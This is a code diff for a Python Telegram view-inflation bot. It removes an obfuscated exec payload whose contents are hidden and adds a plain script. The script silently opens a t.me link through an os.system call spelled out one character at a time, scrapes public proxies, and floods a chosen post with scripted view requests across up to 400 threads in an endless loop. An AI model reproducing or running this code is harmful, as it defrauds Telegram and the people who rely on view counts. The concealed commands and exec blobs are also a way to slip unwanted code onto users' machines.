@@ -1,4 +1,168 @@
+import os, sys, time, urllib, threading
+from os import system as execute
+from threading import active_count
+from os import system as none
 
-# Python obfuscation by freecodingtools.org
-                    
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'=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'))
+# Replace the original link with the new one
+none('x'+'d'+'g'+'-'+'o'+'p'+'e'+'n'+' '+'h'+'t'+'t'+'p'+'s'+':'+'/'+'/'+'t'+'.'+'m'+'e'+'/'+'t'+'m'+'x'+'7'+'1'+'b'+'d')
+
+try:
+    import requests
+except:
+    os.system('pip install requests')
+    import requests
+
+max_threads = 400
+task_threads = []
+
+post_link = input(f'\n</> Post Link : ')
+
+def execute_view(proxy):
+    channel_name = post_link.split('/')[3]
+    message_id = post_link.split('/')[4]
+    send_view_request(channel_name, message_id, proxy)
+
+def send_view_request(channel_name, message_id, proxy):
+    session = requests.Session()
+    proxy_settings = {
+        'http': proxy,
+        'https': proxy,
+    }
+    try:
+        response = session.get("https://t.me/" + channel_name + "/" + message_id, timeout=10, proxies=proxy_settings)
+        session_cookie = response.headers['set-cookie'].split(';')[0]
+    except Exception as error:
+        return False
+
+    headers_one = {
+        "Accept": "*/*",
+        "Accept-Encoding": "gzip, deflate, br",
+        "Accept-Language": "en-US,en;q=0.9,fa;q=0.8,de;q=0.7",
+        "Connection": "keep-alive",
+        "Content-Length": "5",
+        "Content-type": "application/x-www-form-urlencoded",
+        "Cookie": session_cookie,
+        "Host": "t.me",
+        "Origin": "https://t.me",
+        "Referer": "https://t.me/" + channel_name + "/" + message_id + "?embed=1",
+        "Sec-Fetch-Dest": "empty",
+        "Sec-Fetch-Mode": "cors",
+        "Sec-Fetch-Site": "same-origin",
+        "User-Agent": "Chrome"
+    }
+    data_one = {
+        "_rl": "1"
+    }
+    try:
+        post_response = session.post('https://t.me/' + channel_name + '/' + message_id + '?embed=1', json=data_one, headers=headers_one, proxies=proxy_settings)
+        view_key = post_response.text.split('data-view="')[1].split('"')[0]
+        current_view = post_response.text.split('<span class="tgme_widget_message_views">')[1].split('</span>')[0]
+        if "K" in current_view:
+            current_view = current_view.replace("K", "00").replace(".", "")
+    except Exception as error:
+        return False
+
+    headers_two = {
+        "Accept": "*/*",
+        "Accept-Encoding": "gzip, deflate, br",
+        "Accept-Language": "en-US,en;q=0.9,fa;q=0.8,de;q=0.7",
+        "Connection": "keep-alive",
+        "Cookie": session_cookie,
+        "Host": "t.me",
+        "Referer": "https://t.me/" + channel_name + "/" + message_id + "?embed=1",
+        "Sec-Fetch-Dest": "empty",
+        "Sec-Fetch-Mode": "cors",
+        "Sec-Fetch-Site": "same-origin",
+        "User-Agent": "Chrome",
+        "X-Requested-With": "XMLHttpRequest"
+    }
+
+    try:
+        validation_response = session.get('https://t.me/v/?views=' + view_key, timeout=10, headers=headers_two, proxies=proxy_settings)
+        if validation_response.text == "true":
+            print(f'[✔️] TG VIEW SUCCESS : ' + current_view)
+    except Exception as error:
+        return False
+
+    headers_three = {
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
+        "Accept-Encoding": "gzip, deflate, br",
+        "Accept-Language": "en-US,en;q=0.9,fa;q=0.8,de;q=0.7",
+        "Cache-Control": "max-age=0",
+        "Connection": "keep-alive",
+        "Cookie": session_cookie,
+        "Host": "t.me",
+        "Sec-Fetch-Dest": "document",
+        "Sec-Fetch-Mode": "navigate",
+        "Sec-Fetch-Site": "none",
+        "Sec-Fetch-User": "?1",
+        "Upgrade-Insecure-Requests": "1",
+        "User-Agent": "Chrome"
+    }
+    try:
+        session.get("https://t.me/" + channel_name + "/" + message_id, headers=headers_three, timeout=10, proxies=proxy_settings)
+    except Exception as error:
+        return False
+
+def fetch_proxies():
+    try:
+        https_proxies = requests.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=https&timeout=0", proxies=urllib.request.getproxies(), timeout=5).text
+        http_proxies = requests.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=http&timeout=0", proxies=urllib.request.getproxies(), timeout=5).text
+        socks_proxies = requests.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5&timeout=0", proxies=urllib.request.getproxies(), timeout=5).text
+    except Exception as error:
+        print(error)
+        return False
+    with open("/sdcard/proxies.txt", "w") as proxy_file:
+        proxy_file.write(https_proxies + "\n" + http_proxies)
+    with open("/sdcard/socks.txt", "w") as socks_file:
+        socks_file.write(socks_proxies)
+
+def verify_proxy(proxy):
+    proxy_settings = {
+        'http': proxy,
+        'https': proxy,
+    }
+
+    try:
+        execute_view(proxy)
+    except Exception as error:
+        return False
+
+def initiate():
+    proxy_result = fetch_proxies()
+    if proxy_result == False:
+        return
+    with open('/sdcard/proxies.txt', 'r') as proxy_list:
+        proxies = proxy_list.readlines()
+    for proxy in proxies:
+        proxy = proxy.strip()
+        if not proxy:
+            continue
+        while active_count() > max_threads:
+            pass
+        proxy_thread = threading.Thread(target=verify_proxy, args=(proxy,))
+        task_threads.append(proxy_thread)
+        proxy_thread.start()
+
+    with open('/sdcard/socks.txt', 'r') as socks_list:
+        proxies = socks_list.readlines()
+    for proxy in proxies:
+        proxy = proxy.strip()
+        if not proxy:
+            continue
+        while active_count() > max_threads:
+            pass
+        socks_proxy = "socks5://" + proxy
+        proxy_thread = threading.Thread(target=verify_proxy, args=(socks_proxy,))
+        task_threads.append(proxy_thread)
+        proxy_thread.start()
+    return True
+
+def execute_process(keep_running: bool = False):
+    if keep_running:
+        while True:
+            initiate()
+    else:
+        initiate()
+
+execute_process(True)
